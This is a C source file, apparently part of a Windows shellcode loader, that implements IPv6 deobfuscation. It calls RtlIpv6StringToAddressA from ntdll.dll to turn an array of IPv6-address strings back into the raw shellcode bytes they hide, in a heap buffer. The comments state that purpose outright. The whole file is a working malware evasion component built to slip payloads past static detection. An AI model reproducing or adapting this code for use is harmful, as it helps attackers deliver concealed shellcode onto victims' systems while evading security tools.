#include "encoders.h"


typedef NTSTATUS (NTAPI* fnRtlIpv6StringToAddressA)(
        PCSTR                   S,
        PCSTR*                  Terminator,
        PVOID                   Addr
);


BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {
        PBYTE           pBuffer         = NULL, TmpBuffer       = NULL;
        SIZE_T          sBuffSize       = 0;
        PCSTR           Terminator      = NULL;
        NTSTATUS        STATUS          = STATUS_SUCCESS;
        
        // getting RtlIpv6StringToAddressA  address from ntdll.dll
#ifdef UNICODE
        fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlIpv6StringToAddressA");
#else
        fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlIpv6StringToAddressA");
#endif
        if (pRtlIpv6StringToAddressA == NULL) {
                DebugPrint("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
                return FALSE;
        }
        // getting the real size of the shellcode (number of elements * 16 => original shellcode size)
        sBuffSize = NmbrOfElements * 16;
        // allocating mem, that will hold the deobfuscated shellcode
        pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
        if (pBuffer == NULL) {
                DebugPrint("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
                return FALSE;
        }
        // setting TmpBuffer to be equal to pBuffer
        TmpBuffer = pBuffer;
        
        
        // loop through all the addresses saved in Ipv6Array
        for (int i = 0; i < NmbrOfElements; i++) {
                // Ipv6Array[i] is a single ipv6 address from the array Ipv6Array
                if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
                        // if failed ...
                        DebugPrint("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);
                        return FALSE;
                }
                
                // tmp buffer will be used to point to where to write next (in the newly allocated memory)
                TmpBuffer = (PBYTE)(TmpBuffer + 16);
        }
        
        *ppDAddress = pBuffer;
        *pDSize = sBuffSize;
        return TRUE;
}